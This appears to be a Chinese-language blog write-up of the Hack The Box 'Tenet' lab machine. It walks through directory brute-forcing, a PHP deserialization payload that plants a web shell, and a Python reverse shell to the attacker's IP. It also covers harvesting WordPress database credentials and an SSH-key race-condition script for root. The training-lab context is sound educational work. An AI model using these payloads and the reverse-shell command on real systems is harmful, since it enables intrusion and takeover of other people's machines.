<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Tenet - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - TenetHackthebox - Tenet 靶场实战 靶场信息   靶场类型   信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.223   我们可以看到，本台靶场开启了22和80端口，咱们访问80端口看看   访问80端口后发现是一个apache2的默认页面，那就可以确定是apache的漏洞入手了 简单查看了一下，没">
<meta property="og:type" content="article">
<meta property="og:title" content="Tenet - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - TenetHackthebox - Tenet 靶场实战 靶场信息   靶场类型   信息搜集 首先使用nmap进行端口扫描 nmap -A -sS -sC -sV 10.10.10.223   我们可以看到，本台靶场开启了22和80端口，咱们访问80端口看看   访问80端口后发现是一个apache2的默认页面，那就可以确定是apache的漏洞入手了 简单查看了一下，没">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/052e12b1-d487-454a-96ea-6cb1d819c2d7.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e26be302-dfe3-4c5f-8ee2-9cf4dd4c513e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/917d4824-d2ed-4bb3-98e7-02b596d30dc5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/510b16ce-e566-4cee-9b1c-3fa47b010102.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/1d1057cd-a1c1-4815-837d-30878bb41e4a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/22450566-01f0-4d3a-bee9-e719ce6a9e13.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/8802405b-2c02-4328-b5a3-4c97deee5090.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/41c08274-6a77-4b1a-976b-c9938649309b.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/195b271b-532e-405e-a4f7-008e88c29081.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/a5902ad7-b1af-4e5d-9e2a-2885cff75b7c.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/72ef8706-0f0b-46eb-b711-5a10e9b11792.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/76168e08-a677-4477-8e83-6584b37021e2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/7da31670-8c15-4117-933d-1835f04a5b77.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/d2677dfb-581d-4c65-a9ac-254f924a6678.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/812e216b-f58f-455a-9b7a-fc9f0fda06ce.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/bc98f7d1-8cae-4d46-b9d7-f2579498d0d5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/82445885-959a-4e87-b66b-60e312f62434.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/76ded797-b7b3-4f60-bc35-be843a330dce.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/309140ae-90f9-44ef-9a4d-b0367be53ae4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/7ee24b68-d72c-4e3f-8a5c-32ee37880c75.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/fa4bc5e7-01a0-4afc-ae9c-657a66a2b170.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/013c36bf-378f-4e5c-af8c-6064ce6fd756.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/f83eedae-42d6-4040-acb8-68daeeb7eb2a.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e64831ef-31e4-4efc-bb62-24d44448d847.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/45c3c0c8-98a1-40b3-927c-15de5fcac111.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/2273a301-6e35-470f-9ef3-5c40c0950f74.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/c5b21ad5-d79e-4d50-939e-99226e18255e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/70e5b2a7-4b5c-444c-a521-812740adc06e.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e3601cf5-5ee5-4573-8ca2-9d706bc49349.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/5a7c71ed-46fc-4538-906e-d20ac17a1927.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/c73c01db-e931-4914-9a50-d09c51c3ccc9.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/be744f9d-7f9e-4070-bf01-90f99b38c270.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/c9bf7956-8bd6-47fa-ad21-d7eb0ed00b92.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e0306962-583f-490b-a657-6bf6a06c9e03.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/8e2b1fbc-ff18-43e5-8fdc-54e70d9b0c93.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/9b8b4d9a-eb01-451b-bde1-97247a36efe5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/1a888b74-7bfe-4800-83ac-7bd83c678b42.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/ebd0886d-924b-4668-a864-d7100ab2925f.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/0886872f-de0a-4337-a3ca-5e5c223f6ea8.png">
<meta property="article:published_time" content="2021-05-31T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:53:35.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/052e12b1-d487-454a-96ea-6cb1d819c2d7.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Tenet - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Tenet - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-05-31T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-05-31
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Tenet"><span class="post-toc-text">Hackthebox - Tenet</span></a></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Medium/Hackthebox-Tenet"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Tenet - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-05-31 19:38:36" datetime="2021-05-31T11:38:36.000Z"  itemprop="datePublished">2021-05-31</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Tenet"><a href="#Hackthebox-Tenet" class="headerlink" title="Hackthebox - Tenet"></a>Hackthebox - Tenet</h1><p><strong>Hackthebox - Tenet 靶场实战</strong></p>
<p><strong>靶场信息</strong></p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/052e12b1-d487-454a-96ea-6cb1d819c2d7.png" class>

<p><strong>靶场类型</strong></p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e26be302-dfe3-4c5f-8ee2-9cf4dd4c513e.png" class>

<p><strong>信息搜集</strong></p>
<p>首先使用nmap进行端口扫描</p>
<p>nmap -A -sS -sC -sV 10.10.10.223</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/917d4824-d2ed-4bb3-98e7-02b596d30dc5.png" class>

<p>我们可以看到，本台靶场开启了22和80端口，咱们访问80端口看看</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/510b16ce-e566-4cee-9b1c-3fa47b010102.png" class>

<p>访问80端口后发现是一个apache2的默认页面，那就可以确定是apache的漏洞入手了</p>
<p>简单查看了一下，没有其他啥东西，咱们先爆个目录吧</p>
<p>懒得使用鼠标了，所以这里咱们使用gobuster进行爆破</p>
<p>gobuster dir -u <a href="http://10.10.10.223/" target="_blank" rel="noopener">http://10.10.10.223</a> -x php,log,txt -w &#x2F;usr&#x2F;share&#x2F;dirbuster&#x2F;wordlists&#x2F;directory-list-2.3-medium.txt –wildcard -o gob</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/1d1057cd-a1c1-4815-837d-30878bb41e4a.png" class>

<p>找到了一个文件一个目录</p>
<p>&#x2F;users.txt</p>
<p>&#x2F;wordpress</p>
<p>咱们先看看&#x2F;users.txt文件</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/22450566-01f0-4d3a-bee9-e719ce6a9e13.png" class>

<p>得到了一个用户名Success，先记录下来，咱们去看看wp</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/8802405b-2c02-4328-b5a3-4c97deee5090.png" class>

<p>嘛玩意儿？你告我这是wordpress？我都准备好砸exp了结果你告诉我这？</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/41c08274-6a77-4b1a-976b-c9938649309b.png" class>

<p>翻了一下网页源代码，在css里发现了一个域名tenet.htb，成吧，还是得去&#x2F;etc&#x2F;hosts里添加一个解析。</p>
<p>vim &#x2F;etc&#x2F;hosts</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/195b271b-532e-405e-a4f7-008e88c29081.png" class>

<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/a5902ad7-b1af-4e5d-9e2a-2885cff75b7c.png" class>

<p>添加后再访问就对劲了</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/72ef8706-0f0b-46eb-b711-5a10e9b11792.png" class>

<p>这里发现有一些文章，但是我这小学英语都不及格的水平…没办法，开翻译器吧</p>
<p>然后我们在其中一篇《Migration》上，找到了一条评论</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/76168e08-a677-4477-8e83-6584b37021e2.png" class>

<p>经过机翻+我个人的理解后，大致意思如下：</p>
<p>你是否删除了sator.php的备份文件？迁移文件不完整，你为啥要这样做？你图啥？（最后一句我自己加的，文里没有）</p>
<p>整理一下目前我们得到的信息</p>
<p>两个用户，分别为neil和管理员protagonist（猜测，证据如下图）</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/7da31670-8c15-4117-933d-1835f04a5b77.png" class>

<p>和一个php文件 sator.php</p>
<p>思路整理，用户neil质问管理员为什么在迁移web程序的时候删除了sator.php从而导致了网站文件不完整，也就是说wordpress目录下是不可能存在这个文件的。但是咱们又要利用到这个文件，那在一开始的apache2目录下尝试一下？</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/d2677dfb-581d-4c65-a9ac-254f924a6678.png" class>

<p>似乎没有什么有用的信息，我又回去看了一下neil用户的评论。</p>
<p>等等？备份文件？那意思就是bak文件？咱们尝试一下</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/812e216b-f58f-455a-9b7a-fc9f0fda06ce.png" class>

<p>我可真是太棒了，现在是凌晨四点，奖励自己一顿烧烤，长胖了都是你们的责任，记得背锅</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/bc98f7d1-8cae-4d46-b9d7-f2579498d0d5.png" class>

<p>成功搞到一份php源码，审计吧。</p>
<p>但是吧，审计确实是我的短板，所以怎么办呢？这个时候丢给“朋友”就好了，老白嫖了</p>
<p><strong>原理讲解</strong></p>
<p>我们可以在这里看到，有一个类 DatabaseExport，其中有两个公共变量 user_file、data 并且在这个类中，有一个公共函数被调用 update_db()，该函数将 data 变量设置为“Success”，这只是一个txt文件，正如你从 sator.php 中看到的那样，最后的网络浏览器有一个magic函数（这个找资料的时候看到的，但我不知道怎么翻译）__destruct()，当一个对象被销毁时，它会自动调用 user_file 将使用来自 data 的内容并将其放入web目录中，这意味着在web目录中创建 users.txt 数据“Success”。</p>
<p>最后我们可以 GET 参数 arepo，现在这里存在一个漏洞，称为“PHP反序列化”</p>
<p>因此，要利用这一点，我们必须修改在这种情况下，类变量 user_file，并将 data 序列化，一旦我们得到了序列化字符串，我们把它传递给 arepo 参数中。</p>
<p><strong>漏洞利用</strong></p>
<p>虽然我代码审计很弱，但我大概看懂了，它生成了一个名为users.txt的文件，内容为Success，那咱们让他生成php文件然后写入一句话木马，这不就成了？</p>
<p>这不就是妥妥的php反序列化吗？</p>
<p>代码</p>
<p>‘;</p>
<p>}</p>
<p>$test &#x3D; serialize(new DatabaseExport);</p>
<p>echo $test;</p>
<p>?&gt;</p>
<p>将上面的代码保存为php文件，然后执行后会得到一个php序列化</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/82445885-959a-4e87-b66b-60e312f62434.png" class>

<p>然后我们需要以url编码的形式把它传递给 GET 参数，所以我们使用cyberchef（或其他工具）来完成</p>
<p><a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)" target="_blank" rel="noopener">https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)</a></p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/76ded797-b7b3-4f60-bc35-be843a330dce.png" class>

<p>O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D</p>
<p>咱们通过 GET 传输，直接粘贴到url里</p>
<p><a href="http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D" target="_blank" rel="noopener">http://10.10.10.223/sator.php?arepo=O:14:%22DatabaseExport%22:2:%7Bs:9:%22user_file%22;s:9:%22shell.php%22;s:4:%22data%22;s:29:%22%3C?php%20system($_GET%5B%22cmd%22%5D);?%3E%22;%7D</a></p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/309140ae-90f9-44ef-9a4d-b0367be53ae4.png" class>

<p>提示已经更新了，那就是成功了</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/7ee24b68-d72c-4e3f-8a5c-32ee37880c75.png" class>

<p>成功执行命令，我们拿到了一个webshell</p>
<p>熟悉我的读者们都知道，我比较喜欢利用python3</p>
<p>所以咱们直接看看是否存在python3</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/fa4bc5e7-01a0-4afc-ae9c-657a66a2b170.png" class>

<p>哦豁 存在python3，这是一件很幸运的事情</p>
<p>咱们直接用python3进行反弹shell</p>
<p>本地监听4444端口</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/013c36bf-378f-4e5c-af8c-6064ce6fd756.png" class>

<p><a href="http://10.10.10.223/shell.php?cmd=python3" target="_blank" rel="noopener">http://10.10.10.223/shell.php?cmd=python3</a> -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.184”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/f83eedae-42d6-4040-acb8-68daeeb7eb2a.png" class>

<p>成功得到了一个稳定的shell，芜湖，起飞</p>
<p>由于我们现在只是www-data用户，权限低的很，现在还得先获取到一个正常的用户</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e64831ef-31e4-4efc-bb62-24d44448d847.png" class>

<p>咱们检查一下cron的工作</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/45c3c0c8-98a1-40b3-927c-15de5fcac111.png" class>

<p>检查一下开放的端口</p>
<p>已经有思路了啊兄弟们</p>
<p>我们可以看到3306端口在我们本地运行着，那多半就是mysql了，咱们直接找mysql的配置文件啊</p>
<p>我记得我以前打过很多wordpress的站（抱歉，都是涉密项目，所以不方便写成文章），在wp-config.php文件里，一般会有数据库的账号密码的，咱们去读取试试</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/2273a301-6e35-470f-9ef3-5c40c0950f74.png" class>

<p>成功拿到</p>
<p>DB_NAME &#x3D; wordprss</p>
<p>DB_USER &#x3D; neil</p>
<p>DB_PASSWORD &#x3D; Opera2112</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/c5b21ad5-d79e-4d50-939e-99226e18255e.png" class>

<p>登陆失败？那这暗示就很明显了，应该是一个用户了，咱们看看去，</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/70e5b2a7-4b5c-444c-a521-812740adc06e.png" class>

<p>等会儿？我以为这是一个数据库用户，没想到权限还挺大？</p>
<p>咱们直接登录吧</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e3601cf5-5ee5-4573-8ca2-9d706bc49349.png" class>

<p>登录成功</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/5a7c71ed-46fc-4538-906e-d20ac17a1927.png" class>

<p>成功拿到user权限的flag</p>
<p><strong>权限提升</strong></p>
<p>咱们老规矩，sudo -l查看一下sudo权限</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/c73c01db-e931-4914-9a50-d09c51c3ccc9.png" class>

<p>发现可以直接用root权限执行enableSSH.sh文件，那提权还不简单？在根目录下本来就存在一个exp.sh，这不提示就来了？咱们查看一下</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/be744f9d-7f9e-4070-bf01-90f99b38c270.png" class>

<p>我怎么看着有点不对劲呢。。。</p>
<p>在迟疑了大概1.25秒后，我悟了！</p>
<p>这TM是其他哥们儿做过后留下的提权脚本！这根本就不是我要的东西！</p>
<p>我丢啊，稍等各位，我先重置一下靶场，再来一次</p>
<p>cat &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/c9bf7956-8bd6-47fa-ad21-d7eb0ed00b92.png" class>

<p>查看这个sh文件才对，刚才搞错了，请大家无视哈</p>
<p>这些内容都比较无聊，咱们直接拉到最底下</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/e0306962-583f-490b-a657-6bf6a06c9e03.png" class>

<p>我们可以看到一个addkey()使用命令创建临时文件的函数mktemp</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/8e2b1fbc-ff18-43e5-8fdc-54e70d9b0c93.png" class>

<p>如果我们在本地机器上运行此命令查看它生成的文件名，我们可以看到每次运行此命令时，文件名都是不一样的</p>
<p>mktemp -u &#x2F;temp&#x2F;ssh-XXXXXX</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/9b8b4d9a-eb01-451b-bde1-97247a36efe5.png" class>

<p>摸了摸我并不存在的头发，这玩意儿真让人头秃</p>
<p>公共密钥获取方法</p>
<p>ssh-keygen 然后根据我们自己的情况进行设置，然后文件保存在&#x2F;root&#x2F;.ssh&#x2F;id-rsa.pub中</p>
<p>将如下代码保存到exp.sh文件</p>
<p>while true</p>
<p>do</p>
<p>echo ‘ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDoVUNa8uk2pi8tECc1c6SsFbq1xlNvnhwzqgEjmN6yyp8u7TIC4VbzgyRC2UnN9dM0wn9mP103gIAxLGXxgy5kl+cquFffZPoOjfd9I4ZLFDHaPr6eXbXSCg445UXG1gAj8b7lPGemz6vApGrlMGjl1TABKMBHCTbzqSVoAxaDZXSiF4kIKKU4b2Dx8Uw7XgTdd+KWZnuIozuYyZlD3+cl&#x2F;&#x2F;inLetupgpP0ZBvcBqAr1UqtCxsMx2Yzy3XfQ&#x2F;VQMW4Qeswuvx98P+kP6wqpq2jXxaEoRkyVcIlQekJg1W+XwuuNixQeli7CQQBgqu7FwUYrftlWZm0br3HNQlVwBgB+zqExOmt8iktcHjw3pLetwI7X7sdB5pUS4QN2hwDDQsAuhaGMt4MAWSLKsgEZJxWT4FTH2R5+eTCXZNbH97aGbH0&#x2F;ONmzZFKm9bOwvnflQ5taIe149JbuPMc6sba5C4FROHagprucjaPDYhp&#x2F;v0q0ztKq2G9Ay5yfCTTFj5sYuk&#x3D; root@root’ |tee &#x2F;tmp&#x2F;ssh-*</p>
<p>done</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/1a888b74-7bfe-4800-83ac-7bd83c678b42.png" class>

<p>添加运行权限 chmod +x exp.sh</p>
<p>然后运行.&#x2F;exp.sh</p>
<p>然后咱们再开一个ssh连接</p>
<p>然后咱们在新开的ssh连接上运行’ sudo &#x2F;usr&#x2F;local&#x2F;bin&#x2F;enableSSH.sh’几次</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/ebd0886d-924b-4668-a864-d7100ab2925f.png" class>

<p>然后咱们测试一下是否可以连接</p>
<p>ssh <a href="mailto:root@10.10.10.223">root@10.10.10.223</a> -i id_rsa</p>
<p>如果不行，咱们就再来一次即可</p>
<img src="/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/0886872f-de0a-4337-a3ca-5e5c223f6ea8.png" class>

<p>成功拿到root权限的flag</p>
<p>正好这个时候我点的烧烤也到了，吃夜宵去</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/&title=《Tenet - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/&title=《Tenet - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Tenet - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2021/06/01/Hackthebox/Medium/Hackthebox-Ophiuchi/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Ophiuchi - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2021/05/28/Hackthebox/Easy/Hackthebox-Spectra/" id="post-next" class="post-nav-link">
